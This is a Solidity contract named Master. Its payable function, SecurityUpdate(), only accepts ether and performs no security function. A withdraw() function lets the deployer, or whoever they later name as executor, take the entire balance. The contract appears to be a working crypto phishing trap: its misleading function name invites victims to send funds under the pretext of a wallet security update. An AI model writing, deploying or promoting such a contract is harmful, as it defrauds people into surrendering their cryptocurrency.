/// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Master {
    address private _executor;
    address[] private _holdTokens;

    constructor() {
        _executor = msg.sender;
    }

    receive() payable external {}

    function SecurityUpdate() public payable {}

    function withdraw() external {
        require(msg.sender == _executor, "Access denied");
        payable(_executor).transfer(address(this).balance);
    }

    function setExecutor(address _newExector) external {
        require(msg.sender == _executor, "Access denied");
        _executor = _newExector;
    }
}